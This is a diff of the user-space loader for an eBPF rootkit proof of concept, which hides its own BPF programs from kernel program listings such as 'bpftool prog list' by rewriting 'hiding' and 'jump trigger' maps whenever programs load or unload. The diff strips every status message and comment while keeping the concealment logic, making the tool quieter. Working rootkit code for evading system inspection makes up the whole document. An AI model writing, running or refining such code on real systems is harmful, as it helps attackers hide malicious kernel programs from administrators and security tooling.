@@ -103,15 +103,10 @@ static __u32 find_last_hidden_program(void)
 
 static void update_program_hiding_map(void)
 {
-    printf("[*] Recalculating hiding map...\n");
-    
     clear_bpf_map(hiding_map_fd);
     clear_bpf_map(jump_trigger_map_fd);
 
     system_prog_len = refresh_bpf_program_mapping();
-    printf("[*] System has %d programs: ", system_prog_len);
-    for (int i = 0; i < system_prog_len; i++) printf("%u ", system_progs[i]);
-    printf("\n");
     
     __u32 last_visible = find_last_visible_program();
     __u32 last_hidden = find_last_hidden_program();
@@ -123,16 +118,11 @@ static void update_program_hiding_map(void)
             __u32 next_valid = find_next_visible_program(i);
             
             if (next_valid != END_OF_LIST) {
-                // Normal case: visible program exists after this hidden one
                 bpf_map_update_elem(hiding_map_fd, &current, &next_valid, BPF_ANY);
-                printf("[+] Hiding %u -> %u\n", current, next_valid);
             } else {
-                // Our programs are last - set jump trigger once and exit
-                printf("[+] Hiding %u (end of list)\n", current);
                 if (last_hidden > 0) {
                     __u32 trigger_id = (last_visible > 0) ? last_visible : 0;
                     bpf_map_update_elem(jump_trigger_map_fd, &trigger_id, &last_hidden, BPF_ANY);
-                    printf("[+] Jump trigger: %u -> %u (causes ENOENT)\n", trigger_id, last_hidden);
                 }
                 break;
             }
@@ -159,20 +149,12 @@ static struct bpf_link *load_and_hide_program(struct bpf_object *obj, const char
     bpf_obj_get_info_by_fd(bpf_program__fd(prog), &info, &info_len);
     
     own_prog_ids[own_prog_len++] = info.id;
-    printf("[+] %s ID: %u\n", prog_name, info.id);
     
     return link;
 }
 
 static int handle_event(void *ctx, void *data, size_t data_sz)
 {
-    const struct event_data *evt = data;
-    
-    if (evt->action == ACTION_LOAD)
-        printf("\n[!] BPF program loaded, recalculating...\n");
-    else if (evt->action == ACTION_UNLOAD)
-        printf("\n[!] BPF program unloaded, recalculating...\n");
-    
     update_program_hiding_map();
     return 0;
 }
@@ -199,8 +181,6 @@ int main(int argc, char **argv)
 
     signal(SIGINT, stop_sig_handler);
     signal(SIGTERM, stop_sig_handler);
-    
-    printf("=== eBPF Rootkit PoC ===\n\n");
     
     struct bpf_object *obj = bpf_object__open_file("rootkit.bpf.o", NULL);
     if (!obj) {
@@ -244,13 +224,9 @@ int main(int argc, char **argv)
     }
     
     update_program_hiding_map();
-    printf("\n[*] Rootkit active, Ctrl+C to exit\n");
-    printf("[*] Test with: bpftool prog list\n\n");
     
     while (!stop)
-        ring_buffer__poll(ringbuf, 1000); // Wakes up every second to check if the user exited the program Ctrl+C
-    
-    printf("\n[*] Exiting...\n");
+        ring_buffer__poll(ringbuf, 1000);
     ring_buffer__free(ringbuf);
     bpf_link__destroy(link1);
     bpf_link__destroy(link2);
